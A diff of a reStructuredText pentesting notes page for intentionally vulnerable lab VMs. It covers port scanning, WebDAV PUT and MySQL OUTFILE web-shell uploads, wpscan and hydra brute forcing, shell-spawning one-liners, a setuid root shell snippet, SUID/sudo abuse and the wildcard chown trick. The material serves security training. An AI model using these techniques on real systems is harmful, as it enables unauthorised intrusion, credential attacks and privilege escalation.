@@ -5,41 +5,50 @@ This post (Work in Progress) mark downs the learning gathered by doing the vulne
 below steps could be followed to find the vulnerabilties.
 
 Finding the IP address
-**************************
+-----------------------
 
-* Netdiscover: an active/passive arp reconnaissance tool
+Netdiscover
+^^^^^^^^^^^
 
- ::
+An active/passive arp reconnaissance tool
 
-   netdiscover [options] 
-   -i interface : The network interface to sniff and inject packets. 
-   -r range : Scan a given range instead of auto scan.
+::
 
-   Example: 
-   netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
+  netdiscover [options] 
+  -i interface : The network interface to sniff and inject packets. 
+  -r range : Scan a given range instead of auto scan.
+
+  Example: 
+  netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
 	
- Interface name for Virtualization Software
+Interface name for Virtualization Software
 
- * Virtualbox : vboxnet 
- * Vmware     : vmnet 
+* Virtualbox : vboxnet 
+* Vmware     : vmnet 
 
-* Nmap: Network exploration tool and security / port scanner 
+Nmap
+^^^^^^
 
- ::
+Network exploration tool and security / port scanner 
 
-   nmap [Scan Type] [Options] {target specification} 
-   -sP/-sn Ping Scan -disable port scan 
+::
 
-   Example: nmap -sP/-sn 192.168.1.0/24
+  nmap [Scan Type] [Options] {target specification} 
+  -sP/-sn Ping Scan -disable port scan 
+
+  Example: nmap -sP/-sn 192.168.1.0/24
 
 Port Scanning
-**************************** 
+--------------
 	
 Port scanning provides a large amount of information on open services and possible exploits that target these services. Two options
 
-* Unicornscan: port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 
+Unicornscan
+^^^^^^^^^^^^
 
- ::  
+A port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 
+
+::  
 
    unicornscan [options] X.X.X.X/YY:S-E 
      -i, --interface : interface name, like eth0 or fxp1, not normally required 
@@ -49,36 +58,39 @@ Port scanning provides a large amount of information on open services and possib
 
     example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
 
-* Nmap: Network exploration tool and security / port scanner 
+Nmap
+^^^^^
 
- ::
+Network exploration tool and security / port scanner 
 
-   nmap [Scan Type] [Options] {target specification} 
+::
 
-   HOST DISCOVERY:
-   -sL: List Scan - simply list targets to scan 
-   -sn: Ping Scan - disable port scan 
-   -Pn: Treat all hosts as online -- skip host discovery
+  nmap [Scan Type] [Options] {target specification} 
 
-   SCAN TECHNIQUES: 
-   -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans 
-   -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans
+  HOST DISCOVERY:
+  -sL: List Scan - simply list targets to scan 
+  -sn: Ping Scan - disable port scan 
+  -Pn: Treat all hosts as online -- skip host discovery
 
-   PORT SPECIFICATION: 
-   -p : Only scan specified ports 
-   Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+  SCAN TECHNIQUES: 
+  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans 
+  -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans
 
-   SERVICE/VERSION DETECTION: 
-   -sV: Probe open ports to determine service/version info
+  PORT SPECIFICATION: 
+  -p : Only scan specified ports 
+  Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
 
-   OUTPUT: 
-   -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once 
-   -v: Increase verbosity level (use -vv or more for greater effect)
+  SERVICE/VERSION DETECTION: 
+  -sV: Probe open ports to determine service/version info
 
-   MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
+  OUTPUT: 
+  -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once 
+  -v: Increase verbosity level (use -vv or more for greater effect)
+
+  MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
 
 
- As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
+As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.
 
 When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.
 
@@ -96,7 +108,8 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
 
 
 Listen to the interface
-**************************** 
+-----------------------
+
 We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
 
 :: 
@@ -111,7 +124,7 @@ We should always listen to the local interface on which the VM is hosted such as
 
 On listening on the port 4444, we recieve a base64 encoded string
 
-.. code :: bash
+::
 
   nc -lvp 4444
   listening on [any] 4444 …
@@ -121,150 +134,208 @@ On listening on the port 4444, we recieve a base64 encoded string
 
 
 From Nothing to a Unprivileged Shell
-****************************************
+------------------------------------
 
-At this point, you would have an idea about the different services and service version running on the system.
+At this point, you would have an idea about the different services and service version running on the system. ( aka Figure out what webservices such as cms or softwares are running on the vulnerable machine )
 
-* **searchsploit**: Exploit Database Archive Search.
+searchsploit
+^^^^^^^^^^^^
+Exploit Database Archive Search
 
- First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
+First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.
 
- ::
+::
 
-   root@kali:~# nmap -sV -A 172.16.73.128
-   **********Trimmed**************
-   10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
-   |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
-   |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
-   | ndmp-version: 
-   |_  ERROR: Failed to get host information from server
-   **********Trimmed**************
+  root@kali:~# nmap -sV -A 172.16.73.128
+  **********Trimmed**************
+  10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+  | ndmp-version: 
+  |_  ERROR: Failed to get host information from server
+  **********Trimmed**************
 
- If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
+If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.
 
- ::
+::
 
-   root@kali:~# searchsploit webmin
-   **********Trimmed**************
-   Description                                                                            Path
-   ----------------------------------------------------------------------------------------------------------------
-   Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
-   Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
-   Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
-   **********Trimmed**************
-   *Insert searchsploit -xml options *
+  root@kali:~# searchsploit webmin
+  **********Trimmed**************
+  Description                                                                            Path
+  ----------------------------------------------------------------------------------------------------------------
+  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
+  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
+  Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
+  **********Trimmed**************
+  *Insert searchsploit -xml options *
 
+SecLists.Org Security Mailing List Archive
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-* **Webserver Opportunities**
+There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_ , if someone has reported any bug for that particular software. 
 
- If a webserver is running on the machine, we can start with running 
+Webservices
+^^^^^^^^^^^^^^^^^^^^^^^
+
+If a webserver is running on the machine, we can start with running 
  
- * **whatweb** to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
+* **whatweb** to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.
 
- * **PUT Method**: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.
+* **PUT Method**: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.
 
-  Curl command can be used to check the options available:
-
-  .. code :: bash
-
-    curl -X OPTIONS -v http://192.168.126.129/test/
-    Trying 192.168.126.129…
-    Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
-    > OPTIONS /test/ HTTP/1.1
-    > Host: 192.168.126.129
-    > User-Agent: curl/7.47.0
-    > Accept: /
-    >
-    < HTTP/1.1 200 OK
-    < DAV: 1,2
-    < MS-Author-Via: DAV
-    < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
-    < Allow: OPTIONS, GET, HEAD, POST
-    < Content-Length: 0
-    < Date: Fri, 29 Apr 2016 09:41:19 GMT
-    < Server: lighttpd/1.4.28
-    <
-    * Connection #0 to host 192.168.126.129 left intact
-
-  The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method`_ 
-
-####.. _"Detecting and exploiting the HTTP Put Method" http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method
-
-  The few are
-
-  * Nmap:
-
-   ::
-
-     nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
-
-  * curl:
-
-   ::
-
-     curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt
-
-
-   or
-
-   :: 
-
-     curl -X PUT -d '
-
- * **Wordpress**
-
-  When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins
-
-  ::
-
-    wpsscan
-      --url       | -u <target url>       The WordPress URL/domain to scan.
-      --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
-      --enumerate | -e [option(s)]        Enumeration.
-      option :
-      	u        usernames from id 1 to 10
-      	u[10-20] usernames from id 10 to 20 (you must write [] chars)
-      	p        plugins
-      	vp       only vulnerable plugins
-      	ap       all plugins (can take a long time)
-      	tt       timthumbs
-      	t        themes
-      	vt       only vulnerable themes
-      	at       all themes (can take a long time)
-      	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
-      	If no option is supplied, the default is "vt,tt,u,vp"
-
-  Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 
-
-  ::
-
-    wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt --username elliot
-
- * Names? Possible Usernames? Possible Passwords? 
-   
-  Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based  on named "namemash.py" available at here which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
-
-  * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
-  * Using VRFY command:
-  * Using RCPT TO command:
-
-
-* **FTP Opportunities**
-
- If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
+ Curl command can be used to check the options available:
 
  ::
 
-   wget -rq ftp://IP --ftp-user=username --ftp-password=password
+   curl -X OPTIONS -v http://192.168.126.129/test/
+   Trying 192.168.126.129…
+   Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
+   > OPTIONS /test/ HTTP/1.1
+   > Host: 192.168.126.129
+   > User-Agent: curl/7.47.0
+   > Accept: /
+   >
+   < HTTP/1.1 200 OK
+   < DAV: 1,2
+   < MS-Author-Via: DAV
+   < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+   < Allow: OPTIONS, GET, HEAD, POST
+   < Content-Length: 0
+   < Date: Fri, 29 Apr 2016 09:41:19 GMT
+   < Server: lighttpd/1.4.28
+   <
+   * Connection #0 to host 192.168.126.129 left intact
 
-* **Remote Code Execution**
+ The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
 
- * MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
+ The few are
+
+ * Nmap:
+
+  ::
+
+    nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
+
+ * curl:
+
+  ::
+
+    curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt
+
+  or
 
   :: 
 
-    echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
-    select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"``
+    curl -X PUT -d '
+
+* **Wordpress**
+
+ When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins
+
+ ::
+
+   wpsscan
+     --url       | -u <target url>       The WordPress URL/domain to scan.
+     --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
+     --enumerate | -e [option(s)]        Enumeration.
+     option :
+     	u        usernames from id 1 to 10
+     	u[10-20] usernames from id 10 to 20 (you must write [] chars)
+     	p        plugins
+     	vp       only vulnerable plugins
+     	ap       all plugins (can take a long time)
+     	tt       timthumbs
+     	t        themes
+     	vt       only vulnerable themes
+     	at       all themes (can take a long time)
+     	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
+     	If no option is supplied, the default is "vt,tt,u,vp"
+
+ Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 
+
+ ::
+
+   wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt --username elliot
+
+* Names? Possible Usernames? Possible Passwords? 
+   
+ Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based  on named "namemash.py" available at here which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
+
+ * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
+ * Using VRFY command:
+ * Using RCPT TO command:
+
+
+* **Brute forcing: hydra:**
+
+  ::
+
+    -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
+    -p PASS  or -P FILE try password PASS, or load several passwords from FILE
+    -U        service module usage details
+    -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
+
+  hydra http-post-form:
+
+  :: 
+
+    hydra -U http-post-form
+
+    Help for module http-post-form:
+    ============================================================================
+    Module http-post-form requires the page and the parameters for the web form.
+
+    By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.
+
+    (Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)
+
+    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
+    First is the page on the server to GET or POST to (URL).
+    Second is the POST/GET variables (taken from either the browser, proxy, etc.
+    with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
+    Third is the string that it checks for an *invalid* login (by default)
+    Invalid condition login check can be preceded by "F=", successful condition
+    login check must be preceded by "S=".
+    This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
+    			The following parameters are optional:
+     			C=/page/uri     to define a different page to gather initial cookies from
+     			(h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
+                     		^USER^ and ^PASS^ can also be put into these headers!
+                     		Note: 'h' will add the user-defined header at the end
+                     		regardless it's already being sent by Hydra or not.
+                     		'H' will replace the value of that header if it exists, by the
+                    		 one supplied by the user, or add the header at the end
+    			Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
+     			All colons that are not option separators should be escaped (see the examples above and below).
+     			You can specify a header without escaping the colons, but that way you will not be able to put colons
+     			in the header value itself, as they will be interpreted by hydra as option separators.
+
+    			Examples:
+     			"/login.php:user=^USER^&pass=^PASS^:incorrect"
+     			"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
+     			"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
+     			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
+     			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
+
+
+FTP Services
+^^^^^^^^^^^^^^^^^^
+
+If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
+
+::
+
+  wget -rq ftp://IP --ftp-user=username --ftp-password=password
+
+Remote Code Execution
+^^^^^^^^^^^^^^^^^^^^^^
+
+* MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
+
+ :: 
+
+   echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
+   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"``
 
 * **Reverse Shells**: Mostly taken from PentestMonkey Reverse shell cheat sheet and Reverse Shell Cheat sheet from HighOn.Coffee
 
@@ -367,146 +438,103 @@ At this point, you would have an idea about the different services and service v
 
     xhost +targetip
 
-* **Spawning a TTY Shell**
+Spawning a TTY Shell
+^^^^^^^^^^^^^^^^^^^^
 
- Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell
+Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   python -c 'import pty; pty.spawn("/bin/sh")'
+  python -c 'import pty; pty.spawn("/bin/sh")'
 
- or
+or
 
- .. code-block :: bash
+.. code-block :: bash
 
-   python -c 'import pty; pty.spawn("/bin/bash")'
+  python -c 'import pty; pty.spawn("/bin/bash")'
 
- .. code-block :: bash
+.. code-block :: bash
 
-   python -c 'import os; os.system("/bin/bash")'
+  python -c 'import os; os.system("/bin/bash")'
 
- .. code-block :: bash
+.. code-block :: bash
 
-   /bin/sh -i
+  /bin/sh -i
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   perl -e 'exec "/bin/sh";'
+  perl -e 'exec "/bin/sh";'
 
- .. code-block :: bash
+.. code-block :: bash
 
-   perl: exec "/bin/sh";
+  perl: exec "/bin/sh";
 
- .. code-block :: bash
+.. code-block :: bash
 
-    ruby: exec "/bin/sh"
+   ruby: exec "/bin/sh"
 
- .. code-block :: bash
+.. code-block :: bash
 
-    lua: os.execute('/bin/sh')
+   lua: os.execute('/bin/sh')
 
- (From within IRB)
+(From within IRB)
 
- .. code-block :: bash
+.. code-block :: bash
 
-    exec "/bin/sh"
+  exec "/bin/sh"
 
- (From within vi)
+(From within vi)
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   :!bash
+  :!bash
 
- (From within vi)
+(From within vi)
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   :set shell=/bin/bash:shell
+  :set shell=/bin/bash:shell
 
- (From within nmap)
+(From within nmap)
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   !sh
+  !sh
 
- Using “Expect” To Get A TTY
+Using “Expect” To Get A TTY
 
- .. code-block :: bash 
+.. code-block :: bash 
 
-   $ cat sh.exp
-   #!/usr/bin/expect
-   # Spawn a shell, then allow the user to interact with it.
-   # The new shell will have a good enough TTY to run tools like ssh, su and login
-   spawn sh
-   interact
+  $ cat sh.exp
+  #!/usr/bin/expect
+  # Spawn a shell, then allow the user to interact with it.
+  # The new shell will have a good enough TTY to run tools like ssh, su and login
+  spawn sh
+  interact
 
 
- * **Brute forcing: hydra:**
-
-  ::
-
-    -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-    -p PASS  or -P FILE try password PASS, or load several passwords from FILE
-    -U        service module usage details
-    -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
-
-  hydra http-post-form:
-
-  :: 
-
-    hydra -U http-post-form
-
-    Help for module http-post-form:
-    ============================================================================
-    Module http-post-form requires the page and the parameters for the web form.
-
-    By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.
-
-    (Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)
-
-    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
-    First is the page on the server to GET or POST to (URL).
-    Second is the POST/GET variables (taken from either the browser, proxy, etc.
-    with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
-    Third is the string that it checks for an *invalid* login (by default)
-    Invalid condition login check can be preceded by "F=", successful condition
-    login check must be preceded by "S=".
-    This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
-    			The following parameters are optional:
-     			C=/page/uri     to define a different page to gather initial cookies from
-     			(h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
-                     		^USER^ and ^PASS^ can also be put into these headers!
-                     		Note: 'h' will add the user-defined header at the end
-                     		regardless it's already being sent by Hydra or not.
-                     		'H' will replace the value of that header if it exists, by the
-                    		 one supplied by the user, or add the header at the end
-    			Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
-     			All colons that are not option separators should be escaped (see the examples above and below).
-     			You can specify a header without escaping the colons, but that way you will not be able to put colons
-     			in the header value itself, as they will be interpreted by hydra as option separators.
-
-    			Examples:
-     			"/login.php:user=^USER^&pass=^PASS^:incorrect"
-     			"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
-     			"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
-     			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
-     			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
 
 Unprivileged shell to privileged shell
-**************************************
-	
-* Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
+---------------------------------------
 
- Suid.c
+Cron.d
+^^^^^^^
 
- ::
+Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.
 
-   int main(void) {
-   setgid(0); setuid(0);
-   execl(“/bin/sh”,”sh”,0); }
+Suid.c
 
-* SUDO -l Permissions
+::
+
+  int main(void) {
+  setgid(0); setuid(0);
+  execl(“/bin/sh”,”sh”,0); }
+
+SUDO -l Permissions
+^^^^^^^^^^^^^^^^^^^^
+
+Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, 
 
 * nmap suid shell:
 
@@ -578,133 +606,96 @@ Unprivileged shell to privileged shell
 
 .. Note :: More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.
 
-* **Privilege esclation from g0tm1lk blog**
- * What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
 
-  ::
+Unix Wildcards
+^^^^^^^^^^^^^^^
 
-    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+The below text is directly from the `here <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>`_.
 
-    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+* Chown file reference trick (file owner hijacking)
 
-    # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
- 
- * Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+ First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.
 
-  ::
+ :: 
 
-    find / -writable -type d 2>/dev/null      # world-writeable folders
-    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
-    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+   [root@defensecode public]# ls -al
+   total 52
+   drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
+   drwx------. 22 user user 4096 Oct 28 17:34 ..
+   -rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
+   -rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
+   -rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
+   -rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
+   -rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
+   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
+   -rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
+   -rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
+   -rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
+   -rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
+   -rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
+   -rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
+   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
+   -rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
+   -rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
 
-    find / -perm -o x -type d 2>/dev/null     # world-executable folders
+ Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.
 
-    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+ :: 
 
- * Any "problem" files? Word-writeable, "nobody" files
+   [root@defensecode public]# chown -R nobody:nobody \*.php
 
-  ::
+ Let's see who owns files now...
 
-    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
-    find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+ :: 
 
-
-* **Unix Wildcards:**
-
- The below text is directly from the `here <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>`_.
-
- * Chown file reference trick (file owner hijacking)
-
-  First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.
-
-  :: 
-
-    [root@defensecode public]# ls -al
-    total 52
-    drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
-    drwx------. 22 user user 4096 Oct 28 17:34 ..
-    -rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
-    -rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
-    -rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
-    -rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
-    -rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
-    -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-    -rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
-    -rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
-    -rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
-    -rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-    -rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-    -rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-    -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-    -rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-    -rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
-
-  Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.
-
-  :: 
-
-    [root@defensecode public]# chown -R nobody:nobody \*.php
-
-
-  Let's see who owns files now...
-
-  :: 
-
